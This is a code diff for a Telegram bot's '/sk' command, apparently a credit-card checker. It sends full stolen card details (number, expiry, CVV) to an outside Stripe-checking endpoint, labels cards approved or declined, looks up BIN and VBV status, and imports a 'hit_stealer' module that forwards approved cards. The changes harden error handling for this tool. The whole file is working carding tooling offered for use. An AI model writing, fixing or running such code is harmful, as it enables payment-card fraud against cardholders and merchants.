@@ -9,13 +9,29 @@ from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
+# --- ROBUST API CHECK FUNCTION (Updated for new API) ---
 async def autostripe_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
     url = f"https://auto-runp.onrender.com/stripe_npnbet?lista={fullcc}"
+    
     try:
         resp = await session.get(url)
-        json_resp = resp.json()
-        status_raw = json_resp.get("status", "Error ⚠️")
-        message = json_resp.get("response", "")
+        resp.raise_for_status() # Check for HTTP errors like 404/500
+
+        content_type = resp.headers.get("content-type", "").lower()
+
+        if "application/json" in content_type:
+            json_resp = resp.json()
+            
+            # This API seems to use lowercase keys. We will assume it's consistent,
+            # but we still wrap it in str() to prevent 'bool has no lower' errors.
+            status_raw = str(json_resp.get("status", "Api Down"))
+            message = json_resp.get("response", "")
+            
+        else:
+            # Handle plain text responses (e.g., just the word "Declined")
+            status_raw = resp.text.strip()
+            message = ""
+
         # Normalize status to match visual styles
         if "approved" in status_raw.lower():
             status = "Approved ✅"
@@ -23,31 +39,38 @@ async def autostripe_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
             status = "Declined ❌"
         else:
             status = "Api Down"
+            
         return {"status": status, "response": message}
-    except Exception as e:
-        return {"status": "Api Down", "response": str(e)}
 
+    except httpx.HTTPStatusError as e:
+        error_message = f"HTTP Error: {e.response.status_code} - {e.response.text[:200]}"
+        return {"status": "Api Down", "response": error_message}
+    except httpx.RequestError as e:
+        error_message = f"Request Error: {str(e)}"
+        return {"status": "Api Down", "response": error_message}
+    except json.JSONDecodeError:
+        # Handle cases where the content-type says JSON but it's not valid
+        return {"status": "Api Down", "response": f"Invalid JSON response. Received: {resp.text[:200]}"}
+    except Exception as e:
+        return {"status": "Api Down", "response": f"An unexpected error occurred: {str(e)}"}
+
+# --- MAIN COMMAND HANDLER (Fixed resource leak) ---
 @Client.on_message(filters.command("sk", [".", "/"]))
 async def autostripe_cmd(Client, message):
+    session = None  # Initialize session to None
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
-
         gateway = "Sk based"
-
+        
         if not checkall[0]:
             return
 
         role = checkall[1]
         getcc = await getmessage(message)
+        
         if not getcc:
-            resp = f"""<b>
-Gate Name: {gateway} ♻️
-CMD: /sk
-
-Message: No CC Found in your input ❌
-
-Usage: /sk cc|mes|ano|cvv</b>"""
+            resp = f"""<b> Gate Name: {gateway} ♻️ CMD: /sk Message: No CC Found in your input ❌ Usage: /sk cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
@@ -55,44 +78,26 @@ Usage: /sk cc|mes|ano|cvv</b>"""
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         bin6 = cc[:6]
 
-        firstresp = f"""
-↯ Checking.
-
-- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
-"""
+        firstresp = f""" ↯ Checking. - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□ """
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, message.id)
 
-        secondresp = f"""
-↯ Checking..
-
-- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
-"""
+        secondresp = f""" ↯ Checking.. - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□ """
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
         start = time.perf_counter()
+        
+        # Create the session for the API call
         session = httpx.AsyncClient(timeout=30, follow_redirects=True)
-
         result = await autostripe_api_check(fullcc, session)
-
+        
         getbin = await get_bin_details(cc)
         getresp = {"status": result["status"], "response": result["response"]}
-
         status_top = getresp["status"]
         status_clean = getresp["response"]
 
-        thirdresp = f"""
-↯ Checking...
-
-- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
-"""
+        thirdresp = f""" ↯ Checking... - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■ """
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
@@ -108,23 +113,22 @@ Usage: /sk cc|mes|ano|cvv</b>"""
         try:
             with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                 vbv_data = file.readlines()
-            bin_found = False
-            for line in vbv_data:
-                line = line.strip()
-                if not line:
-                    continue
-                parts = line.split('|')
-                if parts[0] == bin6:
-                    bin_found = True
-                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
-                    break
-            if not bin_found:
-                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
+                bin_found = False
+                for line in vbv_data:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    parts = line.split('|')
+                    if parts[0] == bin6:
+                        bin_found = True
+                        vbv_status = parts[2] if len(parts) > 2 else parts[1]
+                        break
+                if not bin_found:
+                    vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
         except FileNotFoundError:
             vbv_status = "VBV BIN file missing"
 
         proxy_status = "Live ✨"
-
         elapsed_time = time.perf_counter() - start
 
         finalresp = f"""
@@ -159,3 +163,4 @@ Usage: /sk cc|mes|ano|cvv</b>"""
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
+        
